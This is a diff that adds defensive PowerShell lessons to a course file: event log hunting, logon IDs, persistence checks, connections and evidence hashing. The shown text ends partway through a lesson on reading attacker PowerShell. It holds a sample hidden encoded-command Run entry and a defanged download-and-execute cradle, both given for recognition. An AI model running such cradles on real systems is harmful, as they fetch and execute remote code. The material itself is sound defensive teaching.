@@ -14,6 +14,11 @@
    "name": "Tools and projects",
    "from": 18,
    "to": 24
+  },
+  {
+   "name": "PowerShell for defenders",
+   "from": 24,
+   "to": 34
   }
  ],
  "lessons": [
@@ -2292,6 +2297,859 @@
     "Regex extracts, Counter counts, argparse configures.",
     "Handle missing files cleanly.",
     "Write it up on GitHub with sample output."
+   ]
+  },
+  {
+   "t": "PowerShell basics: cmdlets and the pipeline",
+   "sub": "Commands named like sentences, passing objects.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Cmdlet: a PowerShell command named Verb-Noun, such as Get-Process.\nPipeline: the | symbol, which passes one command's output to the next.\nObject: a structured item with named properties, such as a process with a Name and an Id."
+    ],
+    [
+     "Where these lessons run",
+     "These lessons use Windows PowerShell 5.1, which comes with Windows 10 and 11. No PowerShell here runs in this app. Run the commands in your Windows VM. These cmdlets are Windows-only, so they won't work in Kali."
+    ],
+    [
+     "Verb-Noun names",
+     "Every cmdlet is a verb and a noun, such as Get-Process or Stop-Service. Nouns are singular by convention. Guess a name, then check it with Get-Command.",
+     "Get-Command -Verb Get -Noun *Event*"
+    ],
+    [
+     "Get-Help",
+     "Get-Help explains a cmdlet. Add -Examples for ready-made examples. Run Update-Help once, as administrator, to download the full help files.",
+     "Get-Help Get-Process -Examples"
+    ],
+    [
+     "Objects, not text",
+     "The pipeline passes objects, not lines of text. So the next command can pick properties by name, with no text parsing. Get-Member lists an object's properties.",
+     "Get-Process | Get-Member -MemberType Properties"
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What does this sample command show?",
+     "code": "PS> Get-Process -Name notepad | Select-Object Name, Id",
+     "o": [
+      "Every property of the notepad process",
+      "Two columns: the Name and the Id",
+      "Only the process Id, as plain text"
+     ],
+     "k": 1,
+     "w": "Two columns: the Name and the Id. Select-Object keeps only the properties you list. Not every property: those are dropped. Not plain text: the output is still objects."
+    },
+    {
+     "d": 2,
+     "q": "Why can Sort-Object sort processes by CPU without any text parsing?",
+     "o": [
+      "It reads the text shown on screen",
+      "PowerShell turns output into CSV first",
+      "The pipeline passes objects with properties"
+     ],
+     "k": 2,
+     "w": "The pipeline passes objects with properties, so Sort-Object reads the CPU property directly. Not screen text or CSV: no conversion happens between commands."
+    },
+    {
+     "d": 1,
+     "q": "In this sample output, which process deserves a closer look?",
+     "code": "   Id ProcessName\n   -- -----------\n  944 svchost\n 4120 explorer\n 6632 svch0st",
+     "o": [
+      "944 svchost",
+      "4120 explorer",
+      "6632 svch0st"
+     ],
+     "k": 2,
+     "w": "6632 svch0st, with a zero instead of the letter o. Malware often copies a real process name with one character changed. Not svchost or explorer: both are normal Windows processes."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. It should list running services, but PowerShell says the term isn't recognised: `Get-Services | Where-Object Status -eq 'Running'`",
+    "hint": "Cmdlet nouns are normally singular.",
+    "solution": "`Get-Service | Where-Object Status -eq 'Running'`. The cmdlet is Get-Service. Get-Services doesn't exist, so PowerShell can't find it."
+   },
+   "tryit": {
+    "h": "Explore PowerShell in your VM",
+    "where": "Windows VM",
+    "p": "Open Windows PowerShell and run these one at a time. Compare the properties Get-Member lists with the columns Get-Process shows.",
+    "code": "$PSVersionTable.PSVersion\nGet-Command -Noun Process\nGet-Help Get-Process -Examples\nGet-Process | Get-Member -MemberType Properties",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Cmdlets are named Verb-Noun, with singular nouns.",
+    "Get-Help and Get-Command find what you need.",
+    "The pipeline passes objects, not text.",
+    "Run these lessons in your Windows VM, not this app."
+   ]
+  },
+  {
+   "t": "Filter, select, sort and group",
+   "sub": "Four cmdlets that turn noise into an answer.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Filter: keep only the items that match a test.\nProperty: a named value on an object, such as Status or CPU.\nGroup: items gathered by a shared value, with a count."
+    ],
+    [
+     "Where-Object filters",
+     "Where-Object keeps objects that match a test. Comparisons use -eq, -ne, -gt, -like (wildcards) and -match (patterns). Text comparisons ignore case by default.",
+     "Get-Service | Where-Object Status -eq 'Stopped'"
+    ],
+    [
+     "Select-Object picks",
+     "Select-Object keeps the properties you name. -First keeps only the first few objects.",
+     "Get-Process | Select-Object Name, Id, CPU -First 5"
+    ],
+    [
+     "Sort-Object orders",
+     "Sort-Object sorts smallest first. Add -Descending for largest first.",
+     "Get-Process | Sort-Object CPU -Descending |\n  Select-Object -First 5"
+    ],
+    [
+     "Group-Object counts",
+     "Group-Object gathers objects by a property and counts each group. It's the quickest way to spot one value that keeps repeating.",
+     "Get-Service | Group-Object Status"
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 2,
+     "q": "What does this sample script show?",
+     "code": "# $logons holds four objects:\n#   kane Fail, admin Fail,\n#   admin Fail, kane Success\n$logons | Where-Object Result -eq 'Fail' |\n  Group-Object User |\n  Sort-Object Count -Descending |\n  Select-Object -First 1 Count, Name",
+     "o": [
+      "Count 1, Name kane",
+      "Count 2, Name admin",
+      "Count 3, Name Fail"
+     ],
+     "k": 1,
+     "w": "Count 2, Name admin. Three failures remain after the filter, grouped as admin 2 and kane 1. Sorting puts admin first. Not kane: it has one failure. Not Fail: the grouping is by User."
+    },
+    {
+     "d": 1,
+     "q": "How does -eq compare text in Where-Object?",
+     "o": [
+      "Ignoring case, by default",
+      "Matching case, by default",
+      "It only compares numbers"
+     ],
+     "k": 0,
+     "w": "Ignoring case, by default, so 'running' matches 'Running'. Not matching case: that's -ceq. Not only numbers: -eq works on text too."
+    },
+    {
+     "d": 1,
+     "q": "Failed logons grouped by source IP. Which source suggests brute force?",
+     "code": "Count Name\n----- ----\n    3 10.10.10.5\n  214 203.0.113.50\n    2 10.10.10.8",
+     "o": [
+      "10.10.10.5",
+      "203.0.113.50",
+      "10.10.10.8"
+     ],
+     "k": 1,
+     "w": "203.0.113.50, with 214 failures from one outside address. Not the other two: a few failures from internal addresses usually means mistyped passwords."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. It should list the 5 processes using the most CPU, but it shows the 5 using the least: `Get-Process | Sort-Object CPU | Select-Object -First 5`",
+    "hint": "Sort-Object sorts smallest first.",
+    "solution": "`Get-Process | Sort-Object CPU -Descending | Select-Object -First 5`. -Descending puts the largest values first."
+   },
+   "tryit": {
+    "h": "Count your services",
+    "where": "Windows VM",
+    "p": "Count services by status, then list stopped services that are set to start automatically.",
+    "code": "Get-Service | Group-Object Status\nGet-Service | Where-Object {\n  $_.Status -eq 'Stopped' -and $_.StartType -eq 'Automatic'\n} | Select-Object Name, DisplayName",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Where-Object filters by a test.",
+    "Select-Object keeps the properties you name.",
+    "Sort-Object sorts smallest first unless you add -Descending.",
+    "Group-Object counts repeats, such as one IP failing many times."
+   ]
+  },
+  {
+   "t": "Reading event logs with Get-WinEvent",
+   "sub": "Filter at the source, not afterwards.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Event log: a Windows record of events, such as Security or System.\nEvent ID: the number for a type of event, such as 4625 for a failed logon.\nHashtable: a list of Name = value pairs inside @{ }, separated by semicolons."
+    ],
+    [
+     "Reading a log",
+     "Get-WinEvent reads Windows event logs. Reading the Security log needs an elevated PowerShell, opened with Run as administrator.",
+     "Get-WinEvent -LogName Security -MaxEvents 5"
+    ],
+    [
+     "Filter at the source",
+     "-FilterHashtable passes your filter to the Windows event log service. It sends back only matching events, which is much faster on a busy server.",
+     "Get-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4625\n  StartTime=(Get-Date).AddHours(-24)\n}"
+    ],
+    [
+     "Why not Where-Object",
+     "Piping to Where-Object reads every event first, then throws most of them away. On a server with millions of events, that can take minutes instead of seconds.",
+     "# Slow: reads everything first\nGet-WinEvent -LogName Security |\n  Where-Object Id -eq 4625"
+    ],
+    [
+     "No matches is an error",
+     "When nothing matches, Get-WinEvent shows the error \"No events were found that match the specified selection criteria\". In scripts, add -ErrorAction SilentlyContinue to hide it."
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "Why use -FilterHashtable instead of piping to Where-Object?",
+     "o": [
+      "It shows more columns",
+      "It filters before events reach PowerShell",
+      "It also reads logs from other computers"
+     ],
+     "k": 1,
+     "w": "It filters before events reach PowerShell, so only matches are sent back. Not more columns: the output is the same. Not other computers: that's the -ComputerName parameter."
+    },
+    {
+     "d": 2,
+     "q": "You run this in a normal, non-admin PowerShell window. What happens?",
+     "code": "PS> Get-WinEvent -LogName Security -MaxEvents 5",
+     "o": [
+      "It asks for a password",
+      "It returns an empty list",
+      "It shows an access error"
+     ],
+     "k": 2,
+     "w": "It shows an access error, because the Security log needs administrator rights. Not an empty list: PowerShell can't read the log at all. Not a password prompt: you need to open an elevated window."
+    },
+    {
+     "d": 2,
+     "q": "In this simplified sample output, which event most suggests someone covering their tracks?",
+     "code": "Time   Id   Message\n----   --   -------\n02:14 1102  The audit log was cleared.\n02:13 4732  A member was added to a group.\n02:13 4720  A user account was created.",
+     "o": [
+      "4720, the new account",
+      "4732, the group change",
+      "1102, the cleared log"
+     ],
+     "k": 2,
+     "w": "1102, the cleared log. Clearing the Security log destroys evidence. Not 4720 or 4732: they're worrying too, but they show what happened rather than hiding it."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. PowerShell rejects it: `Get-WinEvent -FilterHashtable @{LogName='Security', Id=4625}`",
+    "hint": "Look at what separates the pairs inside @{ }.",
+    "solution": "`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}`. Pairs in a hashtable are separated by semicolons or new lines, not commas."
+   },
+   "tryit": {
+    "h": "Find your own failed logon",
+    "where": "Windows VM, elevated PowerShell",
+    "p": "Lock the screen and type a wrong password once, then sign in. Then find the failure.",
+    "code": "Get-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4625\n  StartTime=(Get-Date).AddMinutes(-30)\n} | Select-Object TimeCreated, Id, Message -First 3",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Get-WinEvent reads Windows event logs.",
+    "The Security log needs an elevated PowerShell.",
+    "-FilterHashtable filters at the source, which is much faster.",
+    "Hashtable pairs are separated by semicolons."
+   ]
+  },
+  {
+   "t": "Failed and successful logons",
+   "sub": "4625, 4624, 4740 and the logon type.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Logon type: a number showing how someone logged on.\nAccount lockout: an account blocked after too many wrong passwords.\nProperties: the data fields inside an event, read by position."
+    ],
+    [
+     "The three IDs",
+     "4624 is a successful logon and 4625 is a failed one. 4740 means an account was locked out. For domain accounts, 4740 is recorded on a domain controller."
+    ],
+    [
+     "Logon types",
+     "Type 2 is at the keyboard, type 3 is over the network, such as a file share, and type 10 is Remote Desktop. With Network Level Authentication (NLA) on, failed Remote Desktop logons usually show as type 3."
+    ],
+    [
+     "Reading fields",
+     "Each event stores its data in Properties. In a 4625 event, position 5 is the account name, 10 is the logon type and 19 is the source IP address.",
+     "$e = Get-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4625} -MaxEvents 1\n$e.Properties[5].Value    # account\n$e.Properties[19].Value   # source IP"
+    ],
+    [
+     "Group to spot brute force",
+     "Turn each failure into a small object, then group by account and IP. A big count for one pair is brute force. Many accounts from one IP is a password spray.",
+     "Get-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4625\n  StartTime=(Get-Date).AddHours(-1)} |\n  ForEach-Object { [pscustomobject]@{\n    User = $_.Properties[5].Value\n    IP   = $_.Properties[19].Value } } |\n  Group-Object User, IP |\n  Sort-Object Count -Descending"
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "A successful 4624 logon shows logon type 10. How did the person log on?",
+     "o": [
+      "At the keyboard",
+      "Over Remote Desktop",
+      "Through a file share"
+     ],
+     "k": 1,
+     "w": "Over Remote Desktop: type 10 is RemoteInteractive. Not the keyboard: that's type 2. Not a file share: network logons are type 3."
+    },
+    {
+     "d": 2,
+     "q": "What does the top line of this sample output show?",
+     "code": "Count Name\n----- ----\n   48 admin, 203.0.113.50\n    3 kane, 10.10.10.5",
+     "o": [
+      "A password spray",
+      "A normal busy morning",
+      "Brute force on one account"
+     ],
+     "k": 2,
+     "w": "Brute force on one account: 48 failures for admin from one IP. Not a spray: that's a few tries across many accounts. Not normal: 48 failures in an hour from an outside address isn't routine."
+    },
+    {
+     "d": 2,
+     "q": "After those 48 failures, this appears. What does it most likely mean?",
+     "code": "Id   Account  LogonType  SourceIP\n--   -------  ---------  --------\n4624 admin    3          203.0.113.50",
+     "o": [
+      "The account was locked out",
+      "The attacker guessed the password",
+      "The firewall blocked the attacker"
+     ],
+     "k": 1,
+     "w": "The attacker guessed the password: a success from the same IP right after the failures. Not a lockout: that's 4740. Not blocked: 4624 means the logon worked."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. It should find failed logons but returns nothing: `Get-WinEvent -FilterHashtable @{LogName='System'; Id=4625}`",
+    "hint": "Which log holds logon events?",
+    "solution": "`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}`. Logon events are in the Security log, not the System log."
+   },
+   "tryit": {
+    "h": "Catch your own brute force",
+    "where": "Windows VM, elevated PowerShell",
+    "p": "Create a lab account, fail its password a few times with runas, then group the failures. Delete the account afterwards.",
+    "code": "net user labuser 'L4b-Only-Passw0rd!' /add\n# Run this 3 times, typing a wrong password each time\nrunas /user:labuser cmd\nGet-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4625\n  StartTime=(Get-Date).AddMinutes(-10)} |\n  ForEach-Object { $_.Properties[5].Value } |\n  Group-Object\nnet user labuser /delete",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "4624 is success, 4625 is failure, 4740 is lockout.",
+    "Types: 2 keyboard, 3 network, 10 Remote Desktop.",
+    "Read fields from Properties by position.",
+    "Group by account and IP to spot brute force or spraying."
+   ]
+  },
+  {
+   "t": "Accounts and privilege",
+   "sub": "Who can do anything on this computer?",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Local administrator: an account with full control of one computer.\nPrivilege: a right to do something powerful, such as changing system settings.\nPersistence: a way an attacker keeps access, such as a new admin account."
+    ],
+    [
+     "Who is an administrator",
+     "Get-LocalGroupMember lists who is in a local group. Check the Administrators group first. Every extra member is another way to take over the computer.",
+     "Get-LocalGroupMember -Group Administrators"
+    ],
+    [
+     "New accounts: 4720",
+     "Event ID 4720 means a user account was created. An account created at night, by an account that doesn't normally manage users, needs checking."
+    ],
+    [
+     "Group changes: 4732",
+     "Event ID 4732 means someone was added to a security-enabled local group, such as Administrators. A 4720 followed by a 4732 is a classic way to create a backdoor admin."
+    ],
+    [
+     "Special privileges: 4672",
+     "Event ID 4672 is logged when an account with admin-level privileges logs on. It's noisy, because SYSTEM triggers it too. Filter out the built-in system accounts first."
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "Which event shows someone being added to the local Administrators group?",
+     "o": [
+      "4672",
+      "4720",
+      "4732"
+     ],
+     "k": 2,
+     "w": "4732, a member added to a security-enabled local group. Not 4720: that's an account being created. Not 4672: that's an admin-level logon."
+    },
+    {
+     "d": 2,
+     "q": "In this sample output, which entry needs checking first?",
+     "code": "ObjectClass Name                 PrincipalSource\n----------- ----                 ---------------\nUser        LAB-PC\\Administrator Local\nGroup       LAB\\Domain Admins    ActiveDirectory\nUser        LAB-PC\\support2      Local",
+     "o": [
+      "LAB-PC\\support2",
+      "LAB\\Domain Admins",
+      "LAB-PC\\Administrator"
+     ],
+     "k": 0,
+     "w": "LAB-PC\\support2, an unexpected local account with admin rights. Not the built-in Administrator or Domain Admins: both are normally in this group on a domain-joined computer."
+    },
+    {
+     "d": 2,
+     "q": "At 02:13, an unknown account triggers 4720, then 4732 adding the new account to Administrators. What's the likely aim?",
+     "o": [
+      "A routine password reset",
+      "Persistence with a backdoor admin",
+      "A Windows update installing"
+     ],
+     "k": 1,
+     "w": "Persistence with a backdoor admin. A new account made an admin at night keeps the attacker's access. Not a password reset: that's a different event. Not an update: updates don't create users."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. It fails because the group isn't found: `Get-LocalGroupMember -Group Administrator`",
+    "hint": "Check the exact group name.",
+    "solution": "`Get-LocalGroupMember -Group Administrators`. The built-in group is Administrators, plural. Administrator is the built-in user account."
+   },
+   "tryit": {
+    "h": "Make and spot a backdoor admin",
+    "where": "Windows VM, elevated PowerShell",
+    "p": "Create a test account, add it to Administrators, find events 4720 and 4732, then remove it.",
+    "code": "net user labadmin 'L4b-Only-Passw0rd!' /add\nnet localgroup Administrators labadmin /add\nGet-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4720,4732\n  StartTime=(Get-Date).AddMinutes(-10)} |\n  Select-Object TimeCreated, Id\nnet user labadmin /delete",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Get-LocalGroupMember shows who is an administrator.",
+    "4720: account created. 4732: added to a local group.",
+    "4720 then 4732 is a classic backdoor admin.",
+    "4672 is noisy: filter out system accounts."
+   ]
+  },
+  {
+   "t": "Persistence: services, tasks and Run keys",
+   "sub": "Where attackers hide so they survive a restart.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Service: a program Windows runs in the background, often from startup.\nScheduled task: a program Windows runs at set times or events.\nRun key: a registry location whose programs start when a user logs on.\nRegistry: Windows' database of settings."
+    ],
+    [
+     "Services and their paths",
+     "Get-CimInstance Win32_Service shows each service's PathName, the program it runs. Get-Service doesn't show it in PowerShell 5.1. A service running from a user or temp folder is suspicious.",
+     "Get-CimInstance Win32_Service |\n  Where-Object PathName -notmatch 'C:\\\\Windows\\\\' |\n  Select-Object Name, State, PathName"
+    ],
+    [
+     "New services: 7045",
+     "Event ID 7045 in the System log means a new service was installed. Attackers often install a service to run their tool with SYSTEM rights.",
+     "Get-WinEvent -FilterHashtable @{\n  LogName='System'; Id=7045}"
+    ],
+    [
+     "Scheduled tasks",
+     "Get-ScheduledTask lists tasks. Most live under \\Microsoft\\. Check the rest, and look at each task's Actions to see what it runs. Event ID 4698 logs task creation, but only if task auditing is turned on.",
+     "Get-ScheduledTask |\n  Where-Object TaskPath -notlike '\\Microsoft\\*' |\n  Select-Object TaskName, TaskPath, State"
+    ],
+    [
+     "Run keys and startup folders",
+     "Programs in Run keys start when a user logs on. Check the machine-wide key and each user's own key. Also check the Startup folders.",
+     "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nGet-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nGet-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "Which log holds Event ID 7045, a new service installed?",
+     "o": [
+      "System",
+      "Security",
+      "Application"
+     ],
+     "k": 0,
+     "w": "System. Service installs are logged by the Service Control Manager there. Not Security: that holds logons and account changes. Not Application: that's for app messages."
+    },
+    {
+     "d": 2,
+     "q": "In this sample Run key output, which entry is suspicious?",
+     "code": "OneDrive    : \"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background\nSecurityHealth : C:\\Windows\\system32\\SecurityHealthSystray.exe\nWinUpdate   : powershell -w hidden -nop -enc JABjAD0A...",
+     "o": [
+      "OneDrive",
+      "WinUpdate",
+      "SecurityHealth"
+     ],
+     "k": 1,
+     "w": "WinUpdate: a hidden PowerShell window running an encoded command, under a fake update name. Not OneDrive or SecurityHealth: both are normal Windows and Microsoft startup entries."
+    },
+    {
+     "d": 2,
+     "q": "In this sample service list, which path needs checking?",
+     "code": "Name      State   PathName\n----      -----   --------\nSpooler   Running C:\\Windows\\System32\\spoolsv.exe\nupdsvc    Running C:\\Users\\Public\\updsvc.exe\nwuauserv  Running C:\\Windows\\system32\\svchost.exe -k netsvcs",
+     "o": [
+      "Spooler",
+      "updsvc",
+      "wuauserv"
+     ],
+     "k": 1,
+     "w": "updsvc, running from C:\\Users\\Public, a folder any user can write to. Not Spooler or wuauserv: both are standard Windows services running from System32."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. The PathName column comes out empty in Windows PowerShell 5.1: `Get-Service | Select-Object Name, PathName`",
+    "hint": "Which command shows the program a service runs?",
+    "solution": "`Get-CimInstance Win32_Service | Select-Object Name, PathName`. In PowerShell 5.1, Get-Service objects have no PathName property. Win32_Service does."
+   },
+   "tryit": {
+    "h": "Hunt for persistence",
+    "where": "Windows VM",
+    "p": "List services outside C:\\Windows, non-Microsoft scheduled tasks and both Run keys. Note anything you can't explain, then look it up.",
+    "code": "Get-CimInstance Win32_Service |\n  Where-Object PathName -notmatch 'C:\\\\Windows\\\\' |\n  Select-Object Name, PathName\nGet-ScheduledTask | Where-Object TaskPath -notlike '\\Microsoft\\*'\nGet-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nGet-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Win32_Service shows the program each service runs.",
+    "7045 in the System log is a new service.",
+    "Check scheduled tasks outside \\Microsoft\\, and their actions.",
+    "Check both Run keys and the Startup folders."
+   ]
+  },
+  {
+   "t": "Processes and network connections",
+   "sub": "What's running, and who is it talking to?",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Process: a running program, with a process ID (PID).\nConnection: a network link between a local port and a remote address.\nOwningProcess: the PID of the program that owns a connection."
+    ],
+    [
+     "Get-Process",
+     "Get-Process lists running processes. The Path property shows where each program runs from. A familiar name in an odd folder is a warning sign.",
+     "Get-Process | Select-Object Id, Name, Path"
+    ],
+    [
+     "Connections and their owners",
+     "Get-NetTCPConnection lists TCP connections. OwningProcess is the PID behind each one. A calculated property can add the process name.",
+     "Get-NetTCPConnection -State Established |\n  Select-Object RemoteAddress, RemotePort, OwningProcess,\n    @{Name='Process'; Expression={\n      (Get-Process -Id $_.OwningProcess).Name }}"
+    ],
+    [
+     "Process creation: 4688",
+     "Event ID 4688 logs each new process. It's off by default. Turn on Audit Process Creation, plus the setting to include the command line, or the event won't show what was run."
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "A connection shows OwningProcess 6632. How do you find which program it is?",
+     "o": [
+      "Get-Service -Id 6632",
+      "Get-Process -Id 6632",
+      "Get-WinEvent -Id 6632"
+     ],
+     "k": 1,
+     "w": "Get-Process -Id 6632, because OwningProcess is a process ID. Not Get-Service: it has no -Id parameter. Not Get-WinEvent: 6632 isn't an Event ID."
+    },
+    {
+     "d": 2,
+     "q": "In this sample output, which connection needs a closer look?",
+     "code": "RemoteAddress  RemotePort Process\n-------------  ---------- -------\n142.250.70.78         443 chrome\n198.51.100.23         443 powershell\n10.10.10.1            445 System",
+     "o": [
+      "chrome to 142.250.70.78",
+      "System to 10.10.10.1:445",
+      "powershell to 198.51.100.23"
+     ],
+     "k": 2,
+     "w": "powershell to 198.51.100.23: PowerShell holding a web connection to an unknown address can be a download or command channel. Not chrome: browsers make web connections. Not System on port 445: that's normal file sharing on the local network."
+    },
+    {
+     "d": 1,
+     "q": "You search for Event ID 4688 and find nothing at all. What's the most likely reason?",
+     "o": [
+      "No programs have started",
+      "4688 is in the System log",
+      "Process creation auditing is off"
+     ],
+     "k": 2,
+     "w": "Process creation auditing is off. It's off by default, so you have to turn it on. Not no programs: Windows starts processes constantly. Not the System log: 4688 is in the Security log."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. The Process column is always empty: `Get-NetTCPConnection -State Listen | Select-Object LocalPort, Process`",
+    "hint": "Connections only carry a process ID. You have to look the name up.",
+    "solution": "`Get-NetTCPConnection -State Listen | Select-Object LocalPort, @{Name='Process'; Expression={(Get-Process -Id $_.OwningProcess).Name}}`. Connections have OwningProcess, not Process, so build the name with a calculated property."
+   },
+   "tryit": {
+    "h": "Who is your VM talking to?",
+    "where": "Windows VM",
+    "p": "List established connections with their process names. Open a website, then run it again and spot the new browser connections.",
+    "code": "Get-NetTCPConnection -State Established |\n  Select-Object RemoteAddress, RemotePort,\n    @{Name='Process'; Expression={\n      (Get-Process -Id $_.OwningProcess).Name }} |\n  Sort-Object Process",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Get-Process shows what's running, and Path shows where from.",
+    "Get-NetTCPConnection shows connections and their owning PID.",
+    "Look the PID up with Get-Process -Id.",
+    "4688 needs process creation auditing turned on."
+   ]
+  },
+  {
+   "t": "Exporting evidence",
+   "sub": "Save what you found so others can trust it.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Evidence: data you collect to show what happened.\nUTC: Coordinated Universal Time, a time zone that never changes for daylight saving.\nHash: a fingerprint of a file. If the file changes, the hash changes."
+    ],
+    [
+     "Export-Csv",
+     "Export-Csv saves objects as a spreadsheet file. In Windows PowerShell 5.1, add -NoTypeInformation, or the first line will be a #TYPE line that breaks some tools.",
+     "Get-Process | Select-Object Id, Name, Path |\n  Export-Csv C:\\Evidence\\processes.csv -NoTypeInformation"
+    ],
+    [
+     "ConvertTo-Json",
+     "ConvertTo-Json keeps nested data. Its default depth is 2, so deeper data is flattened into text. Set -Depth higher for complex objects.",
+     "Get-NetTCPConnection |\n  ConvertTo-Json -Depth 3 |\n  Set-Content C:\\Evidence\\connections.json"
+    ],
+    [
+     "Record times in UTC",
+     "Write timestamps in UTC so evidence from different computers lines up, even across daylight saving changes. Format \"o\" gives a standard timestamp with its offset.",
+     "(Get-Date).ToUniversalTime().ToString('o')"
+    ],
+    [
+     "Hash what you collect",
+     "Get-FileHash records a SHA-256 fingerprint of each evidence file. Write it in your notes. Anyone can rerun it later to show the file hasn't changed.",
+     "Get-FileHash C:\\Evidence\\processes.csv -Algorithm SHA256"
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 2,
+     "q": "In Windows PowerShell 5.1, what's the first line of this sample file?",
+     "code": "PS> [pscustomobject]@{User='kane'} |\n      Export-Csv C:\\Evidence\\u.csv\nPS> Get-Content C:\\Evidence\\u.csv -TotalCount 1",
+     "o": [
+      "\"User\", the header",
+      "\"kane\", the data",
+      "A #TYPE line"
+     ],
+     "k": 2,
+     "w": "A #TYPE line naming the object type, because 5.1 adds it without -NoTypeInformation. Not \"User\": the header comes second. Not \"kane\": the data comes after the header."
+    },
+    {
+     "d": 1,
+     "q": "Why record evidence times in UTC?",
+     "o": [
+      "Local time can't record seconds",
+      "Times from different systems line up",
+      "UTC is easier for people to read"
+     ],
+     "k": 1,
+     "w": "Times from different systems line up, even across time zones and daylight saving. Not seconds: local time is just as precise. Not readability: most people find local time easier to read."
+    },
+    {
+     "d": 1,
+     "q": "Why record a file's SHA-256 hash when you collect it?",
+     "o": [
+      "To prove later it hasn't changed",
+      "To make the file smaller",
+      "To encrypt the file"
+     ],
+     "k": 0,
+     "w": "To prove later it hasn't changed. The same file always gives the same hash. Not smaller or encrypted: a hash doesn't change the file at all."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command for Windows PowerShell 5.1. A colleague's tool can't read the file: `Get-Process | Export-Csv C:\\Evidence\\procs.csv`",
+    "hint": "What extra line does 5.1 add at the top?",
+    "solution": "`Get-Process | Export-Csv C:\\Evidence\\procs.csv -NoTypeInformation`. Without it, the first line is a #TYPE line that many tools can't read. Then hash the file with Get-FileHash."
+   },
+   "tryit": {
+    "h": "Collect and hash",
+    "where": "Windows VM",
+    "p": "Export your running processes, note the UTC time and hash the file. Change one character in the file, then hash it again and compare.",
+    "code": "New-Item -ItemType Directory C:\\Evidence -Force | Out-Null\nGet-Process | Select-Object Id, Name, Path |\n  Export-Csv C:\\Evidence\\processes.csv -NoTypeInformation\n(Get-Date).ToUniversalTime().ToString('o')\nGet-FileHash C:\\Evidence\\processes.csv",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Use Export-Csv -NoTypeInformation in 5.1.",
+    "Set ConvertTo-Json -Depth for nested data.",
+    "Record timestamps in UTC.",
+    "Hash evidence files with Get-FileHash."
+   ]
+  },
+  {
+   "t": "Reading attacker PowerShell",
+   "sub": "Recognise it, decode it, never build it.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "-EncodedCommand: a PowerShell option that takes a command as Base64 text.\nDownload cradle: a short command that downloads code and runs it straight away.\nScript block logging: a Windows setting that records the PowerShell code that runs."
+    ],
+    [
+     "Encoded commands",
+     "-EncodedCommand, often shortened to -enc, takes Base64 of UTF-16LE text, the way Windows stores text. Attackers use it to hide commands from casual reading. Decoding it shows the real command."
+    ],
+    [
+     "Decode it yourself",
+     "You can decode it in Python. Base64 turns into bytes, and UTF-16LE turns the bytes into text. This lesson's editor runs real Python, so try it there. Terminal Lesson 15 covers Base64."
+    ],
+    [
+     "Download cradles",
+     "These download and run code in one line. Recognise the pattern: a download method such as DownloadString or Invoke-WebRequest, passed into IEX, short for Invoke-Expression. Flags like -w hidden and -nop often come with it.",
+     "# Recognise only. Address defanged.\nIEX (New-Object Net.WebClient).DownloadString('hxxp://198.51.100.23/a')"
+    ],
+    [
+     "Logging that catches it",
